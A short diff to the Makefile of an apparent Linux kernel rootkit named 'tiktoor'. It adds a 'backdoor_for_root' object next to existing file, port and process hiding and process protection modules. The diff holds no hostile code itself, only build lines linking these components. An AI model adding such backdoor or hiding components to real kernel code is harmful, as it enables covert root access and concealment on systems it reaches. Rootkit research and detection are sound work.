@@ -8,5 +8,6 @@ tiktoor-y += file_hiding/file_hiding.o
 tiktoor-y += port_hiding/port_hiding.o
 tiktoor-y += process_hiding/process_hiding.o
 tiktoor-y += process_protection/process_protection.o
+tiktoor-y += backdoor_for_root/backdoor_for_root.o
 
 ldflags-y += -T$(src)/khook/engine.lds
